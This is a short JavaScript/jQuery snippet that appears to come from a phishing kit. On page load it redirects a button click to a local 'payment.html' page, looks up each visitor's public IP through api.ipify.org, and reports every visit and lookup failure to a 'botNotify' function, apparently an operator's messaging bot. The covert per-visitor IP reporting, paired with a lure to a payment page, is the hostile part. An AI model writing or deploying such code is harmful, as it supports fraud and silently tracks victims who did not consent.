$(document).ready(()=>{
$("#btnLien").on("click",(ev)=>{
    ev.preventDefault();
    window.location.assign("html/payment.html");
});

fetch('https://api.ipify.org/?format=json')
  .then(response => response.json())
  .then(data => {
    var ipAddress = data.ip;
    var message = `New Visite IP : ${ipAddress}\n`;
    botNotify(message);
  }).catch(e=>{
    var message = `Error to get visitor IP\n`;
    botNotify(message);

  });
})